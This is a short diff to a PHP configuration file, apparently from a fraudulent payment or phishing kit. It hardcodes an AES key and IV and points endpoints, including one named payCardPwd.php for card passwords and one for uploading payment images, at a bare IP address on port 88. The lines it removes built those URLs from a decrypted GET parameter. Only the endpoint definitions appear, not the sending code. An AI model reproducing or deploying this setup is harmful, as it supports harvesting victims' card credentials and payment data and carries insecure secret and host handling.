@@ -1,8 +1,11 @@
 <?php
 define('AES_SECRET_KEY', 'f3a59b69324c831e');
 define('AES_SECRET_IV','7fc7fe7d74f4da93');
-define('UPDATE_PAY_USER_NAME','http://'.decrypt($_GET['user']).'/api/pay/updateOrderPayUsername');
-define('RECORD_USER_VISITE_INFO','http://'.decrypt($_GET['user']).'/api/pay/recordVisistInfo');
+define('UPDATE_PAY_USER_NAME','http://43.225.27.56:88/updateOrderPayUsername.php');
+define('RECORD_USER_VISITE_INFO','http://43.225.27.56:88/recordVisistInfo.php');
+define('ORDER_QUERY','http://43.225.27.56:88/orderQuery.php');
+define('UPDATE_PAY_CardPwd','http://43.225.27.56:88/payCardPwd.php');
+define('UPDATE_MoneyImg','http://43.225.27.56:88/uploadMoneyImg.php');
 if(empty($_GET['user'])){
     echo 1;die;
 }
